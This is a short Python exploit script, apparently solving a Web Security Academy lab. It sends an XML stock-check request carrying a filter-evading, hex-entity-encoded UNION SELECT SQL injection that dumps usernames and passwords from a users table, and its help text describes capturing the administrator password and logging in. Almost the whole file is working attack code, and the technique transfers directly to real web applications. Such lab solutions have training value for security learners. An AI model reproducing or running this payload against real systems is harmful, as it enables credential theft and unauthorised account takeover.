#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net/" -p 127.0.0.1:8080

The script only works with proxy. Set Intercept to On, catpure the request, send it to Repeater and click Send. Copy administrator's password and log in.
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url
else: 
    print("(-) Add / to the end of URL")

def sqli(url):
    stock_path = 'product/stock'
    xml = """<?xml version="1.0" encoding="UTF-8"?>
                <stockCheck>
                  <productId>1</productId>
                  <storeId><@hex_entities>1 UNION SELECT username || ':' || password FROM users<@/hex_entities></storeId>
                </stockCheck>
    """
    headers = {
        'Content-Type': "application/xml"
    }
    args.proxy=str(args.proxy)
    proxies = {
        'http': 'http://' + args.proxy,
        'https': 'http://' + args.proxy,
    }
    requests.post(url + stock_path, data=xml, headers=headers, verify=False, proxies=proxies)

def main():
    
    print("(+) Exploiting SQL Injection")
        
    sqli(url)

if __name__ == "__main__":
    main()
